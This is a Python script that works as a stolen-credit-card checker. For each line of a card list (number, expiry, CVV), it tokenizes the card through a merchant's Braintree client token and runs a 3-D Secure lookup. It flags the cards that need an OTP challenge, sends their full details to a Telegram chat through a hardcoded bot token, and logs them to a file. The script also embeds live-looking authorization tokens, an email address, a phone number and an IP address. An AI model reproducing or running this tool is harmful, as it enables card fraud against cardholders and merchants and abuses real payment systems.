import requests
from colorama import Fore
import telebot
name = 'cc.txt'
id = '5697294848'
token = "7123764569:AAHwXvulWLlA3MnHBIsF9WtD1Q6UbKHrq4s"
bot = telebot.TeleBot(token)
with open(name, "r", encoding="utf-8") as file:
    for line in file:
        visa= line.strip()
        card = visa.split('|')[0]
        xx = visa.split('|')[1]
        yy = visa.split('|')[2]
        cv = visa.split('|')[3]
        bin = visa.split('|')[0][0:6]
        headers = {
            "accept": "*/*",
            "accept-language": "ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5",
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg4Mzc1NjMsImp0aSI6IjI4ZjQwOTJiLTBiOGEtNGZiYi1iNjFhLTk1MmUzOGJhNGMxMSIsInN1YiI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InBheXBhcmFhcnRjb20ifX0.ZodW3fxokwkyC0TUFPIzCVSVVTD71ljYr1y4t1rsLZ1SQrAr4_veKcQ26s2oXcBgmkwPZVsgQlfCJqVVQGNFkw',
            "braintree-version": "2018-05-10",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "priority": "u=1, i",
            "referer": "https://assets.braintreegateway.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }
        json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '5d671333-751f-4aff-a616-73e7ce0277aa',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!, $authenticationInsightInput: AuthenticationInsightInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }     authenticationInsight(input: $authenticationInsightInput) {      customerAuthenticationRegulationEnvironment    }  } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': card,
                'expirationMonth': xx,
                'expirationYear': yy,
                'cvv': cv,
            },
            'options': {
                'validate': False,
            },
        },
        'authenticationInsightInput': {
            'merchantAccountId': 'payparaartcom',
        },
    },
    'operationName': 'TokenizeCreditCard',
}
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = response.json()['data']['tokenizeCreditCard']['token']
        headers = {
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://3dmodels.org',
    'priority': 'u=1, i',
    'referer': 'https://3dmodels.org/',
    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 
}
        json_data = {
            "amount": "30.00",
            "browserColorDepth": 24,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "ar-EG",
            "browserScreenHeight": 768,
            "browserScreenWidth": 1366,
            "browserTimeZone": -180,
            "deviceChannel": "Browser",
            "additionalInfo": {
                "ipAddress": "197.63.222.193",
                "billingPhoneNumber": "11279201854",
                "billingGivenName": "jeff",
                "billingSurname": "wilson",
                "email": "alidevgraphic@gmail.com",
            },
            "bin": bin,
            "dfReferenceId": "0_c8b45187-25f4-4771-b9dd-2bcb93180e0f",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.103.0",
                "cardinalDeviceDataCollectionTimeElapsed": 425,
                "issuerDeviceDataCollectionTimeElapsed": 10669,
                "issuerDeviceDataCollectionResult": False,
            },
            'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg4Mzc1NjMsImp0aSI6IjI4ZjQwOTJiLTBiOGEtNGZiYi1iNjFhLTk1MmUzOGJhNGMxMSIsInN1YiI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InBheXBhcmFhcnRjb20ifX0.ZodW3fxokwkyC0TUFPIzCVSVVTD71ljYr1y4t1rsLZ1SQrAr4_veKcQ26s2oXcBgmkwPZVsgQlfCJqVVQGNFkw',
            "braintreeLibraryVersion": "braintree/web/3.103.0",
            "_meta": {
                "merchantAppId": "3dmodels.org",
                "platform": "web",
                "sdkVersion": "3.103.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": "5d671333-751f-4aff-a616-73e7ce0277aa",
            },
        }
        response = requests.post(
    f'https://api.braintreegateway.com/merchants/np36c2tr5dtm362n/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
        msg = 'VISA TYPE IS NOT SUPPORTED'
        if visa.startswith("4") or visa.startswith("5"):
            msg = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
        if 'challenge_required' in msg:
            name2 = 'otp.txt'
            print(Fore.GREEN + f'YOUR CARD IS OTP ✅ {visa}\n response : {msg}')
            bot.send_message(
                id,
                f"YOUR CARD IS OTP ✅\n\ncard: {visa}\n\nresponse : {msg}\n\nbot by - @TL_FQ",
            )
            file = open(name2,'a',encoding='utf-8')
            file.write('\nvisa')

        elif 'authenticate_attempt_successful' in msg:
            print(Fore.RED + f'authenticate_attempt_successful❎ {visa}\n response : {msg}')
        elif 'authenticate_rejected' in msg:
            print(Fore.RED + f'authenticate_rejected❎ {visa}\n response : {msg}')
        elif 'authenticate_frictionless_failed' in msg:
            print(Fore.RED + f"authenticate_frictionless_failed❎ {visa}\n response : {msg}")
        elif 'VISA TYPE IS NOT SUPPORTED' in msg:
            print(Fore.LIGHTYELLOW_EX+ visa + ' this visa is not supported')
        elif 'authenticate_successful' in msg:
            print(Fore.RED + f"authenticate_successful❎ {visa}\n response : {msg}")
        elif 'lookup_error' in msg:
            print(Fore.RED + f"lookup_error❎ {visa}\n response : {msg}")
        else:
            print(Fore.YELLOW + f'this got a differnt reponse OOPS : {msg}')
